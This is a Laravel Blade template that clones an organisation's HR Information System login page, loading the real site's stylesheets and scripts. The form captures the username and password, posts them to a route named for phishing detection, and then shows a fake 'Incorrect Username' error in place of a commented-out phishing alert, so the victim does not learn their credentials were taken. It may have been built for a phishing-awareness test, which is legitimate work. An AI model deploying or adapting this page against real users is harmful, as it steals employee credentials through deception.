<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="origin-trial"
        content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    <meta http-equiv="imagetoolbar" content="no">
    <meta name="MSSmartTagsPreventParsing" content="true">
    <!--<meta http-equiv="refresh" content="5" />-->
    <title>HR System</title>
    <style type="text/css" media="all">
        @import "https://hris.sl-maritime.com/css/loginstyles.css";
    </style>
    <link rel="stylesheet" href="https://hris.sl-maritime.com/css/humanity/jquery-ui-1.8.21.custom.css">
    <script type="text/javascript" async=""
        src="https://www.gstatic.com/recaptcha/releases/yiNW3R9jkyLVP5-EEZLDzUtA/recaptcha__en.js" crossorigin="anonymous"
        integrity="sha384-7+IRLxkl1z6qr/oVEzkUcOT7nJWJEREgLpBaZWNupuW+U8zyeMHDFv52Ok8DA41S"></script>
    <script type="text/javascript" src="https://hris.sl-maritime.com/jquery/jquery-1.7.2.min.js"></script>
    <script type="text/javascript" src="https://hris.sl-maritime.com/jquery/jquery-ui-1.8.21.custom.min.js"></script>

</head>

<body>
    <center>
        <div style="width:100%;position:absolute;border:0px solid #000;">
            <center>
                <div></div>
            </center>
        </div>
        <div style="padding-top:103px;">
            <div></div>
        </div>
        <script type="text/javascript">
            $(document).ready(function() {
                $('input#btn_submit').button();
                $('#div_message').fadeIn(1000).delay(5000).fadeOut(1000);
            })
        </script>
        <br>
        <div class="p-head"></div>
        <div class="ui-corner-all loginmedia">
            <div class="p-post">
                <div class="p-item"></div>
            </div>
            <div class="ui-corner-all loginheader">
                <div>LOGIN</div>
            </div>
            {{-- @if (session()->has('success'))
            <div style="margin: 5px;padding: 7px;background: #ffbbbb; border: 1px solid #ff0000;">
                <span style="font-family: arial;font-weight: 600;font-size:11pt;">Alert Phising</span>
                <p style="font-family: arial;font-size:10pt;">
                    {{ session('success') }}</div>
            @endif --}}
            @if (session()->has('success'))
            <div style="margin: 5px;padding: 7px;background: #ffbbbb; border: 1px solid #ff0000;">
                <span style="font-family: arial;font-weight: 600;font-size:11pt;">Incorrect Username</span>
                <p style="font-family: arial;font-size:10pt;">
                The username you entered does not belong to any account.<br>Make sure that it is typed correctly or recheck your captcha!		</p>
            </div>
            @endif
            <div class="logincont">
                <div class="loginpos">
                    <form id="form_tp" method="POST" action="{{ route('phisingdetected.phisingdetected_save') }}">
                        @csrf
                        <p><span>Before entering into the application, please type your account!</span>
                            <br>Username
                            <br><input type="text" name="username_detected" id="username_detected" size="40" required>
                            <br>Password
                            <br><input type="password" name="password_detected" id="password_detected" size="40" required>


                        <div id="html_element" style="align-items: center; display: flex;"></div>

                        <br>
                        <div><input type="submit" id="btn_submit" name="btn_submit" value="Submit"
                                class="ui-button ui-widget ui-state-default ui-corner-all" role="button"
                                aria-disabled="false"></div>
                        <p></p>
                    </form>
                    <div class="loginpos">

                    </div>
                </div>
            </div>

        </div>
        <br>
        <div class="p-foot">[ <b>
                <font color="black">Human Resources</font>
                <font color="red">Information</font>
                <font color="black">System</font>
            </b> ]<br>© 2019</div>
    </center>



    <div
        style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
        <div
            style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;">
        </div>
        <div class="g-recaptcha-bubble-arrow"
            style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;">
        </div>
        <div class="g-recaptcha-bubble-arrow"
            style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;">
        </div>
        <div style="z-index: 2000000000; position: relative;"><iframe title="recaptcha challenge expires in two minutes"
                name="c-sa84s21nsetz" frameborder="0" scrolling="no"
                sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
                src="https://www.google.com/recaptcha/api2/bframe?hl=en&amp;v=yiNW3R9jkyLVP5-EEZLDzUtA&amp;k=6Ld0I0giAAAAAMpg76RKMIOnO45A1za9AUlUNfjd"
                style="width: 100%; height: 100%;"></iframe></div>
    </div>

    <script type="text/javascript">
        var onloadCallback = function() {
            grecaptcha.render('html_element', {
                'sitekey': '6LcRECApAAAAAGLmJbs0iaKBKZmtyn2evq9LC7Cr'
            });
        };
    </script>

    <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit" async defer></script>

    @include('sweetalert::alert')
</body>

</html>
